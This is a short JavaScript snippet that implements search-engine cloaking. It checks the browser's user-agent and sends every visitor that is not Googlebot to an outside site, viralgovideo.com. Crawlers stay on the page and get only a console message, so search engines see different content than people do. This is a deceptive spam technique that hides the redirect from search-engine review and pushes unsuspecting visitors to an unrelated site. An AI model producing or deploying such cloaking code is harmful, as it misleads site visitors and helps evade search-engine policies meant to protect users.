// Check if the user-agent is not from a search engine crawler (e.g., Googlebot)
if (!navigator.userAgent.includes('Googlebot')) {
  // Redirect only normal users
  window.location.href = "https://viralgovideo.com/?AR1";
} else {
  // For search engine crawlers, you can choose to perform a different action or not redirect
  console.log("Thanks for visiting my page");
}